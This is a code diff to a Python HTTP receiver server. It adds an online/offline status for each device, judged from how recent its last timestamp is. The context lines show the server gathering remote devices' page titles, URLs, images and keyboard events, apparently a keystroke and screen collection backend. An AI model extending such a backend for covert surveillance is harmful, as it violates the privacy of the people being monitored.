@@ -369,6 +369,25 @@ class ReceiverHandler(BaseHTTPRequestHandler):
         for device_key in sorted(state.keys()):
             entry = state[device_key]
             device_id = entry.get('device_id') or device_key
+            # determine online/offline based on timestamp recency
+            status = 'Offline'
+            try:
+                ts = entry.get('timestamp')
+                if ts:
+                    try:
+                        parsed = datetime.fromisoformat(ts)
+                    except Exception:
+                        parsed = None
+                    if parsed is not None:
+                        if parsed.tzinfo is None:
+                            parsed = parsed.replace(tzinfo=timezone.utc)
+                        age = datetime.now(timezone.utc) - parsed
+                        threshold = int(os.environ.get('RECEIVER_ONLINE_THRESHOLD', '30'))
+                        if age.total_seconds() <= threshold:
+                            status = 'Online'
+            except Exception:
+                status = 'Offline'
+
             devices.append({
                 'device_id': device_id,
                 'safe_device_id': entry.get('safe_device_id') or device_key,
@@ -380,6 +399,7 @@ class ReceiverHandler(BaseHTTPRequestHandler):
                 'encoding': entry.get('encoding'),
                 'title': entry.get('title'),
                 'url': entry.get('url'),
+                'status': status,
                 'archive_name': entry.get('archive_name'),
                 'image_url': f"/device_image?device_id={quote(str(device_id))}",
                 'keyboard_events': entry.get('keyboard_events', []),
